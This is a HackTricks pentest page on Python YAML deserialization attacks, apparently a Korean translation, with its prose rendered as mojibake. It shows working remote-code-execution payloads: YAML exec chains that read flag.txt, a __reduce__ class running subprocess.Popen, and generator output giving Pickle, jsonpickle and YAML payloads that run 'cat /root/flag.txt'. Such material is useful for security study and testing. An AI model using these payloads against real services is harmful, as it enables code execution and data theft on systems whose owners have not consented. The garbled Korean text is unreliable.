# íŒŒì´ì¬ Yaml ì—­ì§ë ¬í™”

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¥¼ í†µí•´ ì œë¡œë¶€í„° ì˜ì›…ì´ ë˜ëŠ” AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”</strong></summary>

ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œ HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê¸¸ ì›í•œë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [Discord ê·¸ë£¹](https://discord.gg/hRep4RUj7f)** ë˜ëŠ” [í…”ë ˆê·¸ë¨ ê·¸ë£¹](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

## Yaml **ì—­ì§ë ¬í™”**

**Yaml** íŒŒì´ì¬ ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” ì›ì‹œ ë°ì´í„°ë¿ë§Œ ì•„ë‹ˆë¼ **íŒŒì´ì¬ ê°ì²´ë¥¼ ì§ë ¬í™”**í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```
print(yaml.dump(str("lol")))
lol
...

print(yaml.dump(tuple("lol")))
!!python/tuple
- l
- o
- l

print(yaml.dump(range(1,10)))
!!python/object/apply:builtins.range
- 1
- 10
- 1
```
í™•ì¸í•´ë³´ì„¸ìš” **íŠœí”Œ**ì€ ë°ì´í„°ì˜ ì›ì‹œ ìœ í˜•ì´ ì•„ë‹ˆë¯€ë¡œ **ì§ë ¬í™”**ë˜ì—ˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  **range**ë„ ë§ˆì°¬ê°€ì§€ì…ë‹ˆë‹¤ (ë‚´ì¥ì—ì„œ ê°€ì ¸ì˜´).

![](<../../.gitbook/assets/image (1040).png>)

**safe\_load()** ë˜ëŠ” **safe\_load\_all()**ì€ SafeLoaderë¥¼ ì‚¬ìš©í•˜ë©° **í´ë˜ìŠ¤ ê°ì²´ ì—­ì§ë ¬í™”ë¥¼ ì§€ì›í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. í´ë˜ìŠ¤ ê°ì²´ ì—­ì§ë ¬í™” ì˜ˆì‹œ:
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
data = b'!!python/object/apply:builtins.range [1, 10, 1]'

print(yaml.load(data, Loader=UnsafeLoader)) #range(1, 10)
print(yaml.load(data, Loader=Loader)) #range(1, 10)
print(yaml.load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=Loader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=UnsafeLoader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=FullLoader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.unsafe_load(data)) #range(1, 10)
print(yaml.full_load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.unsafe_load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>

#The other ways to load data will through an error as they won't even attempt to
#deserialize the python object
```
ì´ì „ ì½”ë“œëŠ” ì§ë ¬í™”ëœ íŒŒì´ì¬ í´ë˜ìŠ¤ë¥¼ ë¡œë“œí•˜ê¸° ìœ„í•´ **unsafe\_load**ë¥¼ ì‚¬ìš©í–ˆìŠµë‹ˆë‹¤. ì´ëŠ” **ë²„ì „ >= 5.1**ì—ì„œ, load()ì— Loaderê°€ ì§€ì •ë˜ì§€ ì•Šì•˜ê±°ë‚˜ Loader=SafeLoaderë¡œ ì§€ì •ë˜ì§€ ì•Šì€ ê²½ìš° **ì§ë ¬í™”ëœ íŒŒì´ì¬ í´ë˜ìŠ¤ë‚˜ í´ë˜ìŠ¤ ì†ì„±ì„ ì—­ì§ë ¬í™”í•˜ëŠ” ê²ƒì„ í—ˆìš©í•˜ì§€ ì•Šê¸° ë•Œë¬¸**ì…ë‹ˆë‹¤.

### ê¸°ë³¸ì ì¸ ì·¨ì•½ì 

**sleepë¥¼ ì‹¤í–‰í•˜ëŠ” ì˜ˆì‹œ**:
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
data = b'!!python/object/apply:time.sleep [2]'
print(yaml.load(data, Loader=UnsafeLoader)) #Executed
print(yaml.load(data, Loader=Loader)) #Executed
print(yaml.load_all(data))
print(yaml.load_all(data, Loader=Loader))
print(yaml.load_all(data, Loader=UnsafeLoader))
print(yaml.load_all(data, Loader=FullLoader))
print(yaml.unsafe_load(data)) #Executed
print(yaml.full_load_all(data))
print(yaml.unsafe_load_all(data))
```
### Loaderê°€ ì—†ëŠ” ì·¨ì•½í•œ .load("\<content>")

pyyamlì˜ **ì´ì „ ë²„ì „**ì€ ë¬´ì–¸ê°€ë¥¼ ë¡œë“œí•  ë•Œ **Loaderë¥¼ ì§€ì •í•˜ì§€ ì•Šì•˜ë‹¤ë©´** ì—­ì§ë ¬í™” ê³µê²©ì— ì·¨ì•½í–ˆìŠµë‹ˆë‹¤: `yaml.load(data)`

[**ì—¬ê¸°ì—ì„œ ì·¨ì•½ì ì— ëŒ€í•œ ì„¤ëª…**](https://hackmd.io/@defund/HJZajCVlP)**ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. í•´ë‹¹ í˜ì´ì§€ì—ì„œ ì œì•ˆëœ **ì•…ìš©**ì€:
```yaml
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
state:
update: !!python/name:exec
```
ë˜ëŠ” @ishaackì´ ì œê³µí•œ ì´ **ì› ë¼ì´ë„ˆ**ë¥¼ ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```yaml
!!python/object/new:str {state: !!python/tuple ['print(exec("print(o"+"pen(\"flag.txt\",\"r\").read())"))', !!python/object/new:Warning {state : {update : !!python/name:exec } }]}
```
**ìµœê·¼ ë²„ì „**ì—ì„œëŠ” ë” ì´ìƒ `.load()`ë¥¼ **`Loader` ì—†ì´ í˜¸ì¶œí•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤**. **`FullLoader`**ëŠ” ì´ëŸ¬í•œ ê³µê²©ì— **ë” ì´ìƒ ì·¨ì•½í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**.

## RCE

**PyYAML** ë˜ëŠ” **ruamel.yaml**ê³¼ ê°™ì€ Python YAML ëª¨ë“ˆì„ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš©ì ì •ì˜ payloadë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ payloadëŠ” ì ì ˆí•œ ì‚´ê·  ì²˜ë¦¬ ì—†ì´ ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì…ë ¥ì„ ì—­ì§ë ¬í™”í•˜ëŠ” ì‹œìŠ¤í…œì˜ ì·¨ì•½ì ì„ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
import subprocess

class Payload(object):
def __reduce__(self):
return (subprocess.Popen,('ls',))

deserialized_data = yaml.dump(Payload()) # serializing data
print(deserialized_data)

#!!python/object/apply:subprocess.Popen
#- ls

print(yaml.load(deserialized_data, Loader=UnsafeLoader))
print(yaml.load(deserialized_data, Loader=Loader))
print(yaml.unsafe_load(deserialized_data))
```
### Payload ìƒì„± ë„êµ¬

ë„êµ¬ [https://github.com/j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator)ë¥¼ ì‚¬ìš©í•˜ì—¬ **Pickle, PyYAML, jsonpickle ë° ruamel.yaml**ì„ ì•…ìš©í•˜ëŠ” python ì§ë ¬í™” í˜ì´ë¡œë“œë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
python3 peas.py
Enter RCE command :cat /root/flag.txt
Enter operating system of target [linux/windows] . Default is linux :linux
Want to base64 encode payload ? [N/y] :
Enter File location and name to save :/tmp/example
Select Module (Pickle, PyYAML, jsonpickle, ruamel.yaml, All) :All
Done Saving file !!!!

cat /tmp/example_jspick
{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["cat", "/root/flag.txt"]}]}]}

cat /tmp/example_pick | base64 -w0
gASVNQAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwDY2F0lIwOL3Jvb3QvZmxhZy50eHSUhpSFlFKULg==

cat /tmp/example_yaml
!!python/object/apply:subprocess.Popen
- !!python/tuple
- cat
- /root/flag.txt
```
### ì°¸ê³  ìë£Œ

* [https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)
* [https://net-square.com/yaml-deserialization-attack-in-python.html](https://net-square.com/yaml-deserialization-attack-in-python.html)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° íˆì–´ë¡œê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì´ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜** íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œë¡œ ì´ë™í•˜ì„¸ìš”.

</details>
